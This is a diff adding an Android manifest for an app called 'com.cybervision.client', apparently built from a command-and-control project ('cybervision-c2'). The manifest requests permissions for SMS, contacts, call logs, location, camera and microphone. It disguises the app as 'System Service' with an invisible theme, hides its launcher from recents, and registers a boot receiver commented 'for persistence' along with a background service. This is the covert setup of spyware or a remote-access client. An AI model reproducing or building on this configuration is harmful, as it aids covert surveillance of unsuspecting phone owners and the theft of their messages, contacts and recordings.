@@ -1,0 +1,131 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.cybervision.client"
+4    android:versionCode="1"
+5    android:versionName="3.2" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="21"
+9        android:targetSdkVersion="33" />
+10
+11    <!-- Permissions -->
+12    <uses-permission android:name="android.permission.INTERNET" />
+12-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:6:5-67
+12-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:6:22-64
+13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+13-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:7:5-79
+13-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:7:22-76
+14    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+14-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:8:5-79
+14-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:8:22-76
+15    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+15-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:9:5-81
+15-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:9:22-78
+16    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+16-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:10:5-75
+16-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:10:22-72
+17    <uses-permission android:name="android.permission.READ_CONTACTS" />
+17-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:11:5-72
+17-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:11:22-69
+18    <uses-permission android:name="android.permission.READ_SMS" />
+18-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:12:5-67
+18-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:12:22-64
+19    <uses-permission android:name="android.permission.SEND_SMS" />
+19-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:13:5-67
+19-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:13:22-64
+20    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+20-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:14:5-70
+20-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:14:22-67
+21    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+21-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:15:5-72
+21-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:15:22-69
+22    <uses-permission android:name="android.permission.CALL_PHONE" />
+22-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:16:5-69
+22-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:16:22-66
+23    <uses-permission android:name="android.permission.CAMERA" />
+23-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:17:5-65
+23-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:17:22-62
+24    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+24-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:18:5-71
+24-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:18:22-68
+25    <uses-permission android:name="android.permission.VIBRATE" />
+25-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:19:5-66
+25-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:19:22-63
+26    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+26-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:20:5-81
+26-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:20:22-78
+27    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+27-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:21:5-81
+27-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:21:22-78
+28    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+28-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:22:5-80
+28-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:22:22-77
+29    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+29-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:23:5-77
+29-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:23:22-74
+30
+31    <application
+31-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:25:5-59:19
+32        android:allowBackup="false"
+32-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:26:9-36
+33        android:debuggable="true"
+34        android:extractNativeLibs="true"
+35        android:label="System Service"
+35-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:27:9-39
+36        android:supportsRtl="true"
+36-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:28:9-35
+37        android:theme="@android:style/Theme.NoDisplay" >
+37-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:29:9-55
+38
+39        <!-- Boot receiver for persistence -->
+40        <receiver
+40-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:32:9-39:20
+41            android:name="com.cybervision.client.BootReceiver"
+41-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:33:13-41
+42            android:enabled="true"
+42-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:34:13-35
+43            android:exported="true" >
+43-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:35:13-36
+44            <intent-filter>
+44-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:36:13-38:29
+45                <action android:name="android.intent.action.BOOT_COMPLETED" />
+45-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:37:17-79
+45-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:37:25-76
+46            </intent-filter>
+47        </receiver>
+48
+49        <!-- Background service -->
+50        <service
+50-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:42:9-45:40
+51            android:name="com.cybervision.client.ClientService"
+51-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:43:13-42
+52            android:enabled="true"
+52-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:44:13-35
+53            android:exported="false" />
+53-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:45:13-37
+54
+55        <!-- Hidden launcher activity -->
+56        <activity
+56-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:48:9-57:20
+57            android:name="com.cybervision.client.LauncherActivity"
+57-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:49:13-45
+58            android:excludeFromRecents="true"
+58-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:50:13-46
+59            android:exported="true"
+59-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:51:13-36
+60            android:theme="@android:style/Theme.NoDisplay" >
+60-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:52:13-59
+61            <intent-filter>
+61-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:53:13-56:29
+62                <action android:name="android.intent.action.MAIN" />
+62-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:54:17-69
+62-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:54:25-66
+63
+64                <category android:name="android.intent.category.LAUNCHER" />
+64-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:55:17-77
+64-->/Users/hackler13/cybervision-c2/android/app/src/main/AndroidManifest.xml:55:27-74
+65            </intent-filter>
+66        </activity>
+67    </application>
+68
+69</manifest>
